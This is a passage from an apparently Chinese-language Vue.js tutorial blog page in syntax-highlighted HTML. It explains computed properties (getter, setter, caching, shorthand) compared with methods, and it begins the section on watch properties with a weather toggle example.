class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;firstName&#125;&#125; - &#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220513144313100.png" alt="image-20220513144313100"></p>
</li>
<li><p>需求二：不论姓输入多少，只取前3位，之后再拼接</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;firstName.slice(0,3)&#125;&#125; - &#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220513144414657.png" alt="image-20220513144414657"></p>
</li>
<li><p>改进：</p>
<ul>
<li><p>我们在插值语法里，写了太多的内容，需要封装一下</p>
</li>
<li><p>先使用<code>methods</code>进行封装</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName()&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fullName</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span>.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">3</span>) + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>注意点：</p>
<ul>
<li><p>只要<code>data</code>中的数据发生改变，<code>vue</code>一定会重新解析模板，这样才可以知道模板中那些地方用到了<code>姓</code>，然后进行更新</p>
</li>
<li><p>当读取到<code>插值语法里面写方法</code>的情况，一定也会重新调用</p>
<ul>
<li><p>这样<code>姓</code>每输入一次，插值语法里<code>fullName</code>方法就会被调用一次</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220513144847991.png" alt="image-20220513144847991"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="1-11-2-2-计算属性"><a href="#1-11-2-2-计算属性" class="headerlink" title="1.11.2.2.计算属性"></a>1.11.2.2.计算属性</h4><ul>
<li><p>要显示的数据不存在，要通过计算得来</p>
<ul>
<li>案例的需求二中的<code>取前3位</code>，就是<code>计算</code></li>
</ul>
</li>
<li><p>在<code>computed</code>对象中定义计算属性</p>
<ul>
<li><p>计算属性，就是拿到你已经有的属性，去加工、计算成新的属性</p>
<ul>
<li>也可以拿到<code>vuex</code>里面的属性</li>
</ul>
</li>
<li><p>写法：</p>
<ul>
<li><p>计算属性也是属性，但不能写在<code>data</code>配置项中，需要新增<code>computed</code>配置项。那我们能不能像<code>data</code>里的那种写法呢？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">     <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">     <span class="attr">data</span>: &#123;</span><br><span class="line">         <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">         <span class="attr">firstName</span>: <span class="string">&#x27;张&#x27;</span>,</span><br><span class="line">         <span class="attr">lastName</span>: <span class="string">&#x27;三&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="attr">computed</span>: &#123;</span><br><span class="line">         <span class="attr">fullName</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure>

<p>这样写会提示缺少<code>getter</code>、并且要写成函数的形式：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220514150448349.png" alt="image-20220514150448349"></p>
</li>
<li><p>正确的写法：要把真正要计算的属性值，写成一个对象，对象里有一个<code>get</code></p>
<ul>
<li><p><code>get</code>：当有人读取<code>fullName</code>时，<code>get</code>就会被调用，且返回值就是<code>fullName</code>的值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fullName</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">get</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fullName的get被调用了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> <span class="string">&#x27;getValue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516140910007.png" alt="image-20220516140910007"></p>
</li>
<li><p><code>vm</code>实例上<code>_data</code>有<code>data</code>里面定义的值，但是没有计算属性的值的，真正要用到计算属性时，会拿到<code>_data</code>里面的值经过一系列计算后的返回值，挂载在<code>vm</code>实例上。也就是说可以通过插值语法读取到，并且不需要显示调用<code>get</code>。</p>
</li>
<li><p><code>get</code>函数中的<code>this</code>，<code>vue</code>已经帮我们维护好了，指向的就是<code>vm</code>实例对象，完整写法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fullName</span>: &#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fullName的get被调用了&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span> <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们多调用几次计算属性：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>不同于之前<code>methods</code>的写法，这里控制台语句只打印了一次</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516142332003.png" alt="image-20220516142332003"></p>
<p>是因为<code>vue</code>帮我们把计算属性做了缓存，当模板解析遇到第二次<code>fullName</code>时，不会再走<code>getter</code>了， 而是直接取缓存里的值，那么缓存的值咋更新呢？</p>
<p>所以计算属性的<code>get</code>函数真正被调用的情况有两种：</p>
<ul>
<li>初次读取计算属性时</li>
<li>所依赖的数据发生变化时</li>
</ul>
</li>
<li><p><code>set</code>：如果不配置<code>set</code>，而去直接修改计算属性，会报如下错误：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516144049567.png" alt="image-20220516144049567"></p>
<p>所以当计算属性被修改时，调用<code>set</code>，我们在<code>set</code>函数里更新计算属性的依赖</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">set</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fullName的set被调用了&#x27;</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstName</span> = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">lastName</span> = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516144917339.png" alt="image-20220516144917339"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="1-11-2-3-计算属性简写形式"><a href="#1-11-2-3-计算属性简写形式" class="headerlink" title="1.11.2.3.计算属性简写形式"></a>1.11.2.3.计算属性简写形式</h4><p>如果计算属性只考虑展示，确定不会修改的话，即只调用<code>get</code>时，可以简写：</p>
<p><code>fullName</code>就不用再写成对象的形式，写成函数形式当作<code>getter</code>使用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="title function_">fullName</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fullName的get被调用了&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> +<span class="variable language_">this</span>.<span class="property">lastName</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：插值语法里调用的时候，不要写成<code>&#123;&#123;fullName()&#125;&#125;</code>的形式，计算属性最终会在<code>vm</code>上挂载一个<code>fullName</code>属性的，直接写成<code>&#123;&#123;fullName&#125;&#125;</code>即可</p>
<h4 id="1-11-2-4-小结：计算属性"><a href="#1-11-2-4-小结：计算属性" class="headerlink" title="1.11.2.4.小结：计算属性"></a>1.11.2.4.小结：计算属性</h4><ul>
<li>定义：要用的属性不存在，要通过已有属性计算得来</li>
<li>原理：底层借助了<code>Object.defineproperty</code>方法提供的<code>getter</code>和<code>setter</code></li>
<li><code>get</code>函数什么时候执行<ul>
<li>初次读取时，会执行一次</li>
<li>当依赖的数据发生改变时会被再次调用</li>
</ul>
</li>
<li>优势：与<code>methods</code>实现相比，模板重复解析时，内部有缓存机制（复用），效率更高，调试方便</li>
<li>备注：<ul>
<li>计算属性最终会出现<code>vm</code>身上，直接读取使用即可</li>
<li>如果计算属性要被修改，那必须写<code>set</code>函数去响应修改，且<code>set</code>中要修改计算属性依赖的相关变量</li>
</ul>
</li>
</ul>
<h3 id="1-11-2-监视属性"><a href="#1-11-2-监视属性" class="headerlink" title="1.11.2.监视属性"></a>1.11.2.监视属性</h3><h4 id="1-11-2-1-小案例"><a href="#1-11-2-1-小案例" class="headerlink" title="1.11.2.1.小案例"></a>1.11.2.1.小案例</h4><p>点击按钮实现天气切换</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>改变天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isHot</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">info</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">isHot</span> ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">changeWeather</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">isHot</span> = !<span class="variable language_">this</span>.<span class="property">isHot</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516152531833.png" alt="image-20220516152531833"></p>
<h4 id="1-11-2-2-监视属性"><a href="#1-11-2-2-监视属性" class="headerlink" title="1.11.2.2.监视属性"></a>1.11.2.2.监视属性</h4><ul>
<li>通过<code>vm</code>对象的<code>$watch()</code>或<code>watch</code>配置来指定监视指定的属性</li>
<li>当属性发生变化时，回调函数自动调用，在函数内部进行计算</li>
</ul>
<p>新需求：检测<code>isHot</code>的改变</p>
<p>要想实现监视，需要添加新的配置字段<code>watch</code>，值是一个对象，再添加需要监视的属性</p>
<p><code>handler</code>配置项：</p>
<p>里面有一个<code>handler</code>函数：当<code>isHot</code>发生改变时，<code>handler</code>函数被调用</p>
